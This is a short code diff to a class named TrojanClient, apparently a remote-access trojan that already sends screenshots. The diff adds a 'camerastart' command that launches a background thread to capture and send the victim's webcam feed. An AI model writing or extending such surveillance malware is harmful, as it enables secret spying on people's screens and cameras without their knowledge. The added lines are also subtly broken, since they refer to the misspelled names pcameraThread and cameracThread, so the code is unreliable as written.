@@ -120,6 +120,8 @@ class TrojanClient:
         self.enablePic = True
         self.picTime = 5  # 每张截图时间间隔为 picTime * 0.05
 
+        self.enableCamera = True
+
         self.picThread = None
         self.width = 672
 
@@ -267,6 +269,11 @@ class TrojanClient:
                 if not self.picThread:
                     self.picThread = Thread(target=self.sendPic, daemon=True)
                     self.picThread.start()
+            elif cmd == 'camerastart':
+                self.enableCamera = True
+                if not self.pcameraThread:
+                    self.cameraThread = Thread(target=self.sendCamera, daemon=True)
+                    self.cameracThread.start()
             elif cmd == "picstop":
                 self.enablePic = False
                 self.picThread = None
